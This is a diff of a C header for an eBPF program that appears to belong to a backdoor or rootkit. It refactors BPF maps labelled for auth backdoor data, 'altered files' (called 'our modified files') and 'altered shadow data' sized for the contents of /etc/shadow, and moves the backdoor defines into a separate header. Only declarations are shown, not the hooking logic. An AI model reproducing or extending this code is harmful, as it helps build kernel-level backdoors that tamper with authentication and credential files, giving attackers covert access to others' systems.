@@ -1,12 +1,9 @@
 #pragma once
 #include "vmlinux.h"
+#include "backdoor.def.h"
 #include <bpf/bpf_helpers.h>
-#include <bpf/bpf_tracing.h>
-#include <bpf/bpf_core_read.h>
 #include <bpf/bpf_endian.h>
 
-#define AUTH_BACKDOOR 1
-#define PASSWD_BACKDOOR 2
 /*
     User defined variables
 */
@@ -31,24 +28,11 @@ struct {
 } auth_elem SEC(".maps");
 
 /*
-    altered files
+    altered files (holding our modified files)
 */
-struct file_block {
-    char buff[8192];
-    int buff_len;
-};
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 2);
     __type(key, int); // 0
     __type(value, struct file_block);
 } files_elem SEC(".maps");
-/*
-    altered shadow data
-*/
-struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 1);
-    __type(key, int); // 0
-    __type(value, char[65536]); 
-} shadow_elem SEC(".maps");
